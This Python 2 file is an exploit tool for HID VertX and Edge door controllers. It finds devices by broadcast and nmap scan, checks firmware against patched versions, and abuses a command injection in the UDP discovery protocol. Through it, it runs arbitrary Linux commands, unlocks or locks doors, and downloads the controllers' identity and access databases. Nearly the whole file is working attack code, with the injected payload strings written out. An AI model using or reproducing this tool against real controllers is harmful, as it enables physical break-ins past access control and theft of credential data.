#!/usr/bin/env python
# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
import netifaces
import nmap
import re
import requests
import socket
import time

try:
	requests.packages.urllib3.disable_warnings()
except:
	pass


class VertxError(Exception):
	def __init__(self, *args, **kwargs):
		Exception.__init__(self, *args, **kwargs)


def main():
	parser = argparse.ArgumentParser(description='Exploit HID VertX and Edge door controllers through command injection or the web interface', version='2.0')
	group = parser.add_mutually_exclusive_group()
	group.add_argument('-a', dest='action', help='Action to perform on VertX controller', choices=['discover', 'unlock', 'lock', 'download'], default='discover', required=False)
	group.add_argument('-r', dest='raw', help='Raw Linux command, (example: ping -c 5 IP)', nargs='+', required=False)
	parser.add_argument('-i', dest='ip', help='VertX controller IP address, (default: 255.255.255.255)', default='255.255.255.255', required=False)
	parser.add_argument('-p', dest='port', help='VertX controller port, (default: 4070)', default=4070, type=int, required=False)
	parser.add_argument('--username', help='VertX web interface username, (default: root)', default='root', required=False)
	parser.add_argument('--password', help='VertX web interface password, (default: pass)', default='pass', required=False)
	args = parser.parse_args()

	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.settimeout(5)
	if args.ip == '255.255.255.255':
		s.bind(('', 0))
		s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

	# Discover
	if args.action == 'discover':
		discover(s, args.ip, args.port, args.action)

	# Raw
	elif args.raw:
		raw(s, args.ip, args.port, args.raw)

	# Unlock, lock, or download
	else:
		door_actions(s, args.ip, args.port, args.username, args.password, args.action)

	s.close()


# Send raw Linux command line payload
def raw(s, ip, port, raw):
	response_data = send_command(s, 'discover;013;', None, ip, port)
	if response_data:
		vertx_mac, vertx_ip, vertx_version, vulnerable = fingerprint(response_data, None)

		if vertx_ip and ip == '255.255.255.255':
			ip = vertx_ip

		payload = "{0};1`{1}`;".format(vertx_mac, ' '.join(raw))
		send_command(s, 'command_blink_on;', payload, ip, port)
	else:
		raise VertxError('VertX controller did not respond')


# Perform action on VertX controller
def door_actions(s, ip, port, username, password, action):
	HEADERS = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Connection': 'keep-alive'
	}

	response_data = send_command(s, 'discover;013;', None, ip, port)
	if response_data:
		vertx_mac, vertx_ip, vertx_version, vulnerable = fingerprint(response_data, action)

		if vertx_ip and ip == '255.255.255.255':
			ip = vertx_ip

		# Download VertX IdentDB and AccessDB
		if action == 'download':
			if vulnerable:
				print_status('Downloading VertX databases')
				commands = [
					'cp /mnt/data/config/IdentDB /mnt/apps/web/',
					'cp /mnt/data/config/AccessDB /mnt/apps/web/',
					'sleep 30',
					'rm /mnt/apps/web/IdentDB',
					'rm /mnt/apps/web/AccessDB'
				]
				upload_script(s, commands, vertx_mac, vertx_ip, port)
				download_db(ip, HEADERS, username, password)
			else:
				print_warn('VertX controller not vulnerable to command injection')

		elif action == 'unlock':
			# Unlock through command injection
			if vulnerable:
				print_status('Unlocking doors using command injection')
				commands = [
					"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(vertx_version),
					'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
					'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
				]
				upload_script(s, commands, vertx_mac, ip, port)

			# Unlock through web interface
			else:
				print_status('Unlocking doors through the web interface')
				url = "https://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=1&MS={2}406".format(ip, vertx_version, str(int(time.time())))
				web_request(url, HEADERS, username, password, action)

		else:
			# Lock through command injection
			if vulnerable:
				print_status('Locking doors using command injection')
				commands = [
					'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
					"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(vertx_version),
					"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi"
				]
				upload_script(s, commands, vertx_mac, ip, port)

			# Lock through web interface
			else:
				print_status('Locking doors through the web interface')
				url = "https://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=0&MS={2}406".format(ip, vertx_version, str(int(time.time())))
				web_request(url, HEADES, username, password, action)
	else:
		raise Exception('VertX controller did not respond')


# Search for VertX controllers on the network
def discover(s, ip, port, action):
	controllers = []

	response_data = send_command(s, 'discover;013;', None, ip, port)
	if response_data:
		vertx_ip = fingerprint(response_data, action)
		controllers.append(vertx_ip)

	# Discover specific device
	if ip != '255.255.255.255':
		return

	network_cidr = get_cidr()
	print_status("Starting Nmap scan on {0}".format(network_cidr))
	vertx_ips = network_scan(network_cidr)
	if vertx_ips:
		controllers = controllers + vertx_ips

	# Unique and print results
	controllers = list(set(controllers))
	if len(controllers) > 0:
		for controller in controllers:
			print_good('VertX door controllers on the network:')
			print(controller)
	else:
		print_warn('No HID door controllers found')


# Get local network CIDR
def get_cidr():
	try:
		default_gateway = netifaces.gateways()
		local_ip = default_gateway['default'][netifaces.AF_INET][0]
		network_cidr = "{0}.0/24".format('.'.join(local_ip.split('.')[:-1]))
	except Exception:
		raise VertxError('Could not identify local IP address')

	return network_cidr


# Use nmap to look for open ports and MAC address
def network_scan(network):
	PORTS = ['4050', '4070']
	found_controllers = []

	nm = nmap.PortScanner()
	nm.scan(network, ','.join(PORTS), arguments='-sS --open -Pn')
	for host in nm.all_hosts():
		try:
			ip = nm[host]['addresses']['ipv4']
			mac = nm[host]['addresses']['mac']

			# MAC address search
			if 'mac' in nm[host]['addresses']:
				mac_regex = re.search('^((?i)00:06:8E:[a-f0-9:]{8})', mac)
				if mac_regex:
					print_good("HID MAC address identified: {0} | {1}".format(ip, mac))
					found_controllers.append(ip)

			# nmap port scan
			if nm[host].has_tcp(int(PORTS[0])) and nm[host]['tcp'][int(PORTS[0])]['state'] == 'open':
				print_good("Open port found: {0}:{1}".format(ip, PORTS[0]))
				found_controllers.append(ip)

			if nm[host].has_tcp(int(PORTS[1])) and nm[host]['tcp'][int(PORTS[1])]['state'] == 'open':
				print_good("Open port found: {0}:{1}".format(ip, PORTS[1]))
				found_controllers.append(ip)
		except Exception as error:
			print error
			continue

	return found_controllers


# Get information about VertX controller
def fingerprint(data, action):
	response_data = data[0].split(';')
	vulnerable = check_version(response_data[7])

	if action == 'discover':
		print_good("VertX Controller Information")
		print("RAW (ASCII): {0}".format(data))
		print("Name: {0}".format(response_data[3]))
		print("Model: {0}".format(response_data[6]))
		print("Version: {0} - ({1})".format(response_data[7], response_data[8]))
		print("IP Address: {0}".format(response_data[4]))
		print("MAC Address: {0}".format(response_data[2]))

		if vulnerable:
			print("Vulnerable: \033[1m\033[32mTrue\033[0m\n")
		else:
			print("Vulnerable: \033[1m\033[33mFalse\033[0m\n")

		return response_data[4]
	else:
		return response_data[2], response_data[4], response_data[6], vulnerable


# Check of VertX controller is vulnerable
def check_version(version):
	# Legacy VertX controllers patched with 2.2.7.568
	if int(version[0]) == 2 and int(version.replace('.', '')) < 227568:
		vulnerable = True

	# EVO VertX controllers patched with 3.5.1.1483
	elif int(version[0]) == 3 and int(version.replace('.', '')) < 3511483:
		vulnerable = True

	else:
		vulnerable = False

	return vulnerable


# Upload script
def upload_script(s, commands, mac, ip, port):
	command = 'command_blink_on;'

	print_status("Sending payload to {0}".format(ip))
	payload_chunks = list(chunk_string('!'.join(commands), 22))
	for payload_chunk in payload_chunks:
		payload = "{0};1`echo '{1}' >> /tmp/a`;".format(mac, payload_chunk)
		send_command(s, command, payload, ip, port)

	print_good('Payload sent successfully')
	time.sleep(1)
	print_status('Formating and executing payload')

	# Remove newlines
	payload = "{0};1`tr -d '\n' < /tmp/a > /tmp/b`;".format(mac)
	send_command(s, command, payload, ip, port)

	# Replace intended newlines
	payload = "{0};1`tr '!' '\n' < /tmp/b > /tmp/a`;".format(mac)
	send_command(s, command, payload, ip, port)

	# Make script executable
	payload = "{0};1`chmod +x /tmp/a`;".format(mac)
	send_command(s, command, payload, ip, port)

	# Execute uploaded script
	payload = "{0};1`/tmp/a`;".format(mac)
	send_command(s, command, payload, ip, port)

	print_status('Sleeping for 10 seconds before cleaning up')
	time.sleep(10)

	# Remove uploaded scripts
	payload = "{0};1`rm /tmp/a`;".format(mac)
	send_command(s, command, payload, ip, port)

	payload = "{0};1`rm /tmp/b`;".format(mac)
	send_command(s, command, payload, ip, port)


# Trigger command injection
def send_command(s, command, payload, ip, port):
	if payload:
		print("({0})".format((payload.rstrip()).replace('\n', '\\n')))
		command_buffer = "{0}{1};{2}".format(command, str(len(command) + len(payload) + 4).zfill(3), payload)
	else:
		print_status("Sending discovery request to {0}".format(ip))
		command_buffer = command

	s.sendto(command_buffer, (ip, port))

	# Parse response
	try:
		payload_response = None
		payload_response = s.recvfrom(1024)
		if payload and payload_response[0].split(';')[0] != 'ack':
			raise VertxError('Failed to send command')
		else:
			return payload_response
	except socket.timeout:
		print_warn('VertX controller did not respond')


# Split command because of 22 character length limit
def chunk_string(command, length):
	return (command[0 + i:length + i] for i in range(0, len(command), length))


def web_request(url, headers, username, password, action):
	try:
		response = requests.get(url, headers=headers, auth=(username, password), verify=False)
		if response:
			vertx_response = (response.text).split(';')[1]
		else:
			vertx_response = None
	except requests.exceptions.RequestException as error:
		raise VertxError(error)

	if vertx_response == '-1504':
		print_good("Door {0}ed".format(action))
	elif vertx_response == '0':
		print_warn("Door {0} failed, bad credentials".format(action))
	else:
		print_warn('VertX controller did not respond')


# Download database
def download_db(ip, headers, username, password):
	databases = ['IdentDB', 'AccessDB']

	for database in databases:
		try:
			url = "http://{0}/{1}".format(ip, database)
			download = requests.get(url, headers=headers, stream=True, auth=(username, password), verify=False)
			if download.status_code == 200:
				with open(database, 'wb') as f:
					for chunk in download.iter_content(chunk_size=1024):
						f.write(chunk)
				f.close()
				print_good("Successfully downloaded {0}".format(database))
			else:
				print_warn("Unable to find database at {0}".format(url))
		except Exception as error:
			raise VertxError(error)


def print_status(msg):
	print("\033[1m\033[34m[*]\033[0m {0}".format(msg))


def print_good(msg):
	print("\033[1m\033[32m[+]\033[0m {0}".format(msg))


def print_warn(msg):
	print("\033[1m\033[33m[!]\033[0m {0}".format(msg))

if __name__ == '__main__':
	main()
